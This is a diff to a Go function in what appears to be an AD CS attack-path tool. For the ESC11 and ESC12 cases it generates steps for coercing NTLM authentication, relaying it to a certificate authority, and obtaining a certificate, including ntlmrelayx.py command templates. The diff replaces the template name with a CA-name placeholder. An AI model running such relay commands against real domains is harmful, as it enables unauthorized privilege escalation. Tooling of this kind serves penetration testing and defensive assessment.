@@ -185,7 +185,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Coerce NTLM authentication from a privileged account (e.g., PetitPotam, PrinterBug)",
 			"Relay coerced NTLM auth to the CA's RPC interface (ICertPassage/MS-ICPR)",
 			"Obtain certificate as the relayed principal",
-			fmt.Sprintf("Command: ntlmrelayx.py -t rpc://<CA_HOSTNAME> -rpc-mode ICPR -icpr-ca-name %q -smb2support", tmpl.Name),
+			fmt.Sprintf("Command: ntlmrelayx.py -t rpc://<CA_HOSTNAME> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support"),
 		}
 	case "ESC12":
 		return []string{
@@ -193,8 +193,8 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Confirm CA private key is stored on a network HSM or DCOM enrollment is unrestricted",
 			"Relay coerced NTLM auth to ICertRequest DCOM interface on the CA server",
 			"Request certificate via DCOM — bypasses web enrollment and RPC restrictions",
-			fmt.Sprintf("Command: ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name %q -smb2support --template %s",
-				cfg.TargetDC, tmpl.Name, tmpl.Name),
+			fmt.Sprintf("Command: ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name <CA_NAME> -smb2support --template %s",
+				cfg.TargetDC, tmpl.Name),
 		}
 	case "ESC14":
 		return []string{
